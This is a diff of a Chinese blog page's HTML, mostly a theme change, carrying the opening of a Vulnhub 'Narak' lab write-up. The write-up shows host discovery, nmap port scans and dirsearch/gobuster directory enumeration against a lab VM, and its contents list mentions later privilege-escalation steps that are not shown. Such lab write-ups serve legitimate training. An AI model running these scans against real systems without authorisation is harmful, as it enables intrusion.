@@ -1,23 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang=zh>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="该靶机难度中等，通过该靶机的渗透，可以学到很多！">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="该靶机难度中等，通过该靶机的渗透，可以学到很多！">
 <meta property="og:type" content="article">
 <meta property="og:title" content="18 Vulnhub Narak Writeup">
 <meta property="og:url" content="https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/index.html">
@@ -48,286 +37,158 @@
 <meta property="article:tag" content="brainfuck">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501192741.png">
-
-
-<link rel="canonical" href="https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/","path":"2022/05/01/18 Vulnhub Narak Writeup/","title":"18 Vulnhub Narak Writeup"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>18 Vulnhub Narak Writeup | HDFZZF's BLOG</title>
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-  <a target="_blank" rel="noopener" href="https://github.com/hdfzzf" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
-
-  <main class="main">
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">HDFZZF's BLOG</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
+    
+    
+      
         
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>18 Vulnhub Narak Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
-  <aside class="sidebar">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20RCE%20ME/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&text=18 Vulnhub Narak Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&is_video=false&description=18 Vulnhub Narak Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=18 Vulnhub Narak Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&name=18 Vulnhub Narak Writeup&description=&lt;p&gt;该靶机难度中等，通过该靶机的渗透，可以学到很多！&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&t=18 Vulnhub Narak Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">1. 靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-text">2. 渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="nav-text">2.2. 访问http服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-text">2.3. get shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-text">2.3.1. 方法1-(暴力破解)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-%E6%89%AB%E6%8F%8Fudp%E7%AB%AF%E5%8F%A3"><span class="nav-text">2.3.2. 方法2-(扫描UDP端口)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">2.4. 权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#get-root%E6%9D%83%E9%99%90"><span class="nav-text">2.4.2. get root权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951-motd%E6%8F%90%E6%9D%83"><span class="nav-text">2.4.2.1. 方法1-(MOTD提权)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-cve-2021-3493"><span class="nav-text">2.4.2.2. 方法2-(CVE-2021-3493)</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">3. 总结</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="hdfzzf"
-      src="/images/zzf.jpg">
-  <p class="site-author-name" itemprop="name">hdfzzf</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">121</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">13</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">194</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author site-overview-item animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/hdfzzf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hdfzzf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:dfhong1998@163.com" title="E-Mail → mailto:dfhong1998@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-        </div>
-      </div>
     </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
-
-
-    </header>
-
-    
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-  <div class="reading-progress-bar"></div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/zzf.jpg">
-      <meta itemprop="name" content="hdfzzf">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="HDFZZF's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          18 Vulnhub Narak Writeup
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-05-01 00:00" itemprop="dateCreated datePublished" datetime="2022-05-01T00:00:00+08:00">2022-05-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-05-02 15:32" itemprop="dateModified" datetime="2022-05-02T15:32:11+08:00">2022-05-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus：</span>
-    
-    <a title="disqus" href="/2022/05/01/18%20Vulnhub%20Narak%20Writeup/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/05/01/18 Vulnhub Narak Writeup/" itemprop="commentCount"></span>
-    </a>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1. 方法1-(暴力破解)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-%E6%89%AB%E6%8F%8Fudp%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2. 方法2-(扫描UDP端口)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-root%E6%9D%83%E9%99%90"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.2. get root权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-motd%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">2.4.2.1. 方法1-(MOTD提权)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-cve-2021-3493"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">2.4.2.2. 方法2-(CVE-2021-3493)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
   </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>8k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>7 分钟</span>
-    </span>
 </div>
 
-        </div>
-      </header>
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        18 Vulnhub Narak Writeup
+    </h1>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <p>该靶机难度中等，通过该靶机的渗透，可以学到很多！</p>
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-30T16:00:00.000Z" itemprop="datePublished">2022-05-01</time>
+        
+        (Updated: <time datetime="2022-05-02T07:32:11.133Z" itemprop="dateModified">2022-05-02</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/MOTD%E6%8F%90%E6%9D%83/" rel="tag">MOTD提权</a>, <a class="tag-link-link" href="/tags/UDP%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" rel="tag">UDP端口扫描</a>, <a class="tag-link-link" href="/tags/brainfuck/" rel="tag">brainfuck</a>, <a class="tag-link-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>, <a class="tag-link-link" href="/tags/webdav%E6%BC%8F%E6%B4%9E/" rel="tag">webdav漏洞</a>, <a class="tag-link-link" href="/tags/%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4/" rel="tag">定制字典爆破</a>, <a class="tag-link-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>该靶机难度中等，通过该靶机的渗透，可以学到很多！</p>
 <span id="more"></span>
 <h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
@@ -358,7 +219,9 @@
 </ul>
 <h1 id="渗透">2. 渗透</h1>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.24</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.24</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
+<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.24
+<span class="token function">sudo</span> nmap -p22,80 -A <span class="token number">10.0</span>.2.24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501192741.png" /></p>
 <p>信息：</p>
 <ul>
@@ -370,12 +233,14 @@
 <p>访问80端口，发现不论是源码还是抓包都没有有用的信息。最开始还以为</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501192922.png" /></p>
 <p>这里面的图片可能存在着隐写，但是尝试过后发现也没有。</p>
-<p>没有办法，进行路径扫描： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.24/</span><br></pre></td></tr></table></figure></p>
+<p>没有办法，进行路径扫描： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://10.0.2.24/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501193218.png" /></p>
 <p>有一个关键的信息，有一个/webdav/的目录，但是状态码是401，也就是需要验证</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501193320.png" /></p>
-<p>但是目前并没有任何相关的用户名和密码的信息，因此，接着利用自己的字典扫描，看一下是否存在隐藏的文件（也可以用gobuster，会更快） <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.24 -f -e html,php,txt -w /usr/share/wordlists/dirb/common.txt</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://10.0.2.24 -w /usr/share/dirb/wordlists/common.txt -x txt,php,html</span><br></pre></td></tr></table></figure></p>
-<p>最终扫描出一个可以的文件 tips.txt，直接访问该文件得到如下信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint to open the door of narak can be found in creds.txt.</span><br></pre></td></tr></table></figure></p>
+<p>但是目前并没有任何相关的用户名和密码的信息，因此，接着利用自己的字典扫描，看一下是否存在隐藏的文件（也可以用gobuster，会更快） <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://10.0.2.24 -f -e html,php,txt -w /usr/share/wordlists/dirb/common.txt
+
+gobuster <span class="token function">dir</span> -u http://10.0.2.24 -w /usr/share/dirb/wordlists/common.txt -x txt,php,html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>最终扫描出一个可以的文件 tips.txt，直接访问该文件得到如下信息： <pre class="line-numbers language-none"><code class="language-none">Hint to open the door of narak can be found in creds.txt.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
